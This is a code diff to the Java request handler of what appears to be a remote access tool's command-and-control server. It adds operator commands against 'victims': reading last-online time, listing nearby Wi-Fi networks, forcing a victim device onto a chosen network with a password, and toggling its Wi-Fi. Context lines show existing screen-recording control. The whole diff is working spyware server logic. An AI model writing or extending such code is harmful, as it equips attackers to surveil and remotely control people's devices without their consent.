@@ -5,6 +5,7 @@ import org.json.simple.JSONObject;
 
 import java.net.*;
 import java.util.ArrayList;
+import java.util.Date;
 
 public class RequestHandler extends ChannelInboundHandlerAdapter {
     private ByteBuf tmp;
@@ -175,6 +176,24 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "get.victim.info":
                     ((AVictim) targetVictim).sendGetVictimInfo((user.getName()));
                     break;
+                case "get.last.online":
+                    String lastOnlineText = new Date(targetVictim.getLastOnlineTimeMills()).toString();
+                    int diff = (int) ((System.currentTimeMillis() - targetVictim.getLastOnlineTimeMills()) / 1000);
+                    if (diff < 60*60)
+                        lastOnlineText = diff + " сек. назад";
+                    user.sendGetLastOnline(lastOnlineText, targetVictim.getName());
+                    break;
+                case "get.wifi.list":
+                    ((AVictim) targetVictim).sendGetWifiList(user.getName());
+                    break;
+                case "wifi.connect":
+                    String ssid = (String) request.get("ssid");
+                    String password = (String) request.get("password");
+                    ((AVictim) targetVictim).sendWifiConnect(ssid, password, user.getName());
+                    break;
+                case "set.wifi.enabled":
+                    ((AVictim) targetVictim).sendSetWifiEnabled((boolean) request.get("enabled"), user.getName());
+                    break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
             }
@@ -249,12 +268,19 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     targetUser.sendStopRecordScreen((String) request.get("code"), aVictim.getName());
                     break;
                 case "get.victim.info":
-                    JSONObject info = (JSONObject) request.get("info");
-                    info.put("lastOnline", aVictim.getLastOnlineTimeMills());
                     targetUser.sendGetVictimInfo((JSONObject) request.get("info"), aVictim.getName());
                     break;
                 case "update.last.online":
                     aVictim.setLastOnlineTimeMills(System.currentTimeMillis());
+                    break;
+                case "get.wifi.list":
+                    targetUser.sendGetWifiList((JSONArray) request.get("wifiList"), aVictim.getName());
+                    break;
+                case "wifi.connect":
+                    targetUser.sendWifiConnect((String) request.get("code"), aVictim.getName());
+                    break;
+                case "set.wifi.enabled":
+                    targetUser.sendSetWifiEnabled((boolean) request.get("wifiState"), aVictim.getName());
                     break;
                 default:
                     aVictim.sendErrorCode(Config.INCORRECT_QUERY);
